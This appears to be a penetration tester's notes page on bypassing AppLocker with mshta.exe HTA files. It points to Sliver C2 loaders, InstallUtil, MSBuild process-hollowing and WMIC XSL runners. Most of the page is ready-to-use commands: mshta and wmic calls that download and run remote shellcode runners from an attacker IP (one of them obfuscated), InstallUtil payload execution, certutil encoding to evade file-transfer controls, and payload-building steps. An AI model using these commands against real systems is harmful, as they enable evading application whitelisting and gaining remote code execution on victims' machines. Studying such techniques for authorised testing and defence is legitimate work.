---
description: Microsoft HTLM Applications (mshta.exe)
---

# MSHTA

## GitHub Tool Library Reference

The following is a collection of various AppLocker bypass tools specific to Microsoft HTML Applications (mshta.exe)

Main Directory: ToolLibrary/AppLocker-CLM/HTA

***

## Sliver HTA Loaders

The following repo's include all things for Basic and Advanced (HTTPS) HTA Loaders to Sliver.&#x20;

### References&#x20;

HTTP Sliver Profile: ToolLibrary/AppLocker-CLM/HTA/Sliver-Basic-HTA-Loader\
HTTPS Sliver Profile: ToolLibrary/AppLocker-CLM/HTA/Sliver-AdvancedHTTPs-HTA-Loader

For Sliver Profile Setup, refer to [Sliver Usage](sliver-usage.md#hta-bypass-for-sliver-agent-initial-foothold)

***

## InstallUtil.hta

using `InstallUtil.exe` within the HTA file to execute in context of `uninstall()` method or more specifically the `[System.ComponentModel.RunInstaller(true)]`.&#x20;

### References

HTA Template Reference: ToolLibrary/AppLocker-CLM/HTA/installutil.hta

```bash
# utility location
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe

# Basic Execution
InstallUtil.exe /logfile= /LogToConsole=false /u payload.exe

# Use windows dev box to encode to bypass file transfer restrictions
C:\Windows\System32\certutil.exe -encode bypass.exe encoded.txt
```

This method should be paired with the AppLocker-Bypass\* .NET assemblies in the following directories

* ToolLibrary/AppLocker-CLM/installUtil/\*

***

## jscript.sct

Using mshta.exe in this example to execute and download .sct shellcode runner

### Rerferences

File Reference: ToolLibrary/AppLocker-CLM/jscript.sct

{% code overflow="wrap" %}
```bash
# Basic Execution of jscript
mshta.exe "javascript:GetObject('script:http://192.168.45.277/jscript.sct');close();"
# slightly offuscated Execution of Jscript
mshta.exe "javascript:a=GetObject;b='script:http://192.168.45.227/jscript.sct';a(b);close();"
```
{% endcode %}

***

## MSBuild.hta

using `msbuild.exe` within HTA file to execute in context of embedded code in xml file.&#x20;

### References

HTA Template Reference: ToolLibrary/AppLocker-CLM/HTA/msbuild.hta\
Payload: ToolLibrary/ProcessHollowing/pshollow.cs\
XOR encoder: ToolLibrary/XOR-Encoder/xorencoder.cs

```bash
# utility location (32-bit)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
# utility location (64 bit)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe

# use XOR encoder for process hollowing payload
# Build the msfvenom payload and paste into xorencoder.cs and build/run solution
```

***

## XSL - WMIC

using `wmic` within HTA file to execute with inline arguments to to the XML Stylesheet Language (XSL) file which contains the code runner.&#x20;

### References

HTA Template Reference: ToolLibrary/AppLocker-CLM/HTA/xsl.hta\
File Reference: ToolLibrary/AppLocker-CLM/XSL/runner.xsl\
Sliver (dll) runner: ToolLibrary/Compiled/Sliver/SliverLoader-\<arch>.dll\
Payload Generator: \[DevBox] C:\Tools\DotNetToJScript\DotNet2JScript \
Sliver (jscript) runner: ToolLibrary/Compiled/Sliver/Sliver-\<arch>.js

{% code overflow="wrap" %}
```bash
# utility location
C:\Windows\System32\wbem\wmic.exe

# Basic execution
wmic process get /format:"http://192.168.45.227/runner.xsl"

# Create shellcode into dll; leverage DotNet2JScript and insert .js into line 10:
C:\Tools\DotNetToJScript>DotNetToJScript.exe SliverLoader-<arch>.dll --lang=Jscript --ver=v4 -o runner.js
# Copy contents of runner.js and place into runner.xsl line 10
```
{% endcode %}
